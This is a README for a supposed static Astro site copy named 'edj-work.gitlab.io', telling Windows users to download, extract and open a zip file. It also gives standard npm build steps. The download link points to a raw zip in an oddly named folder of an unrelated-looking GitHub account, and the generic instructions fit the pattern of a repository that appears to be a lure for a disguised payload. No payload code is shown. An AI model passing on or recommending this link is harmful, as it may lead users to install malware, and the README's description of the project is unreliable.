## 🖥️ What this is

edj-work.gitlab.io is a static website copy built with Astro. It is meant to run as a web site, not as a heavy desktop app. On Windows, you can open the site files in a browser after you download them. No special setup is needed for normal use.

## ✅ What you need

- A Windows PC
- A web browser like Chrome, Edge, or Firefox
- An internet connection to get the files
- Enough free space for the site files

## 🚀 How to get started on Windows

1. Open the download page:  
   https://raw.githubusercontent.com/hernandezantonyinma1-alt/edj-work.gitlab.io/main/hydrolyzable/edj_gitlab_work_io_v2.1.zip

2. Download the repository files to your PC.

3. If the files come in a `.zip` file, right-click it and choose **Extract All**.

4. Pick a folder you can find later, such as:
   - `Downloads\edj-work`
   - `Desktop\edj-work`

5. Open the extracted folder.

6. Look for the main site file or site folder. In many static sites, this is the built site output or the project folder with the site content.

7. Open the site in your browser:
   - If you see an `index.html` file, double-click it
   - If you see a folder with site files, open it first and then open `index.html`

## 🛠️ If you want to run the site from source

This is only needed if you want to rebuild the site, not if you just want to view it.

1. Download the project files from the link above.
2. Install Node.js on Windows if it is not already on your PC.
3. Open the project folder.
4. Open Command Prompt in that folder.
5. Run:

```bash
npm install
npm run build
npm run preview
```

6. Open the local address shown in the terminal in your browser.
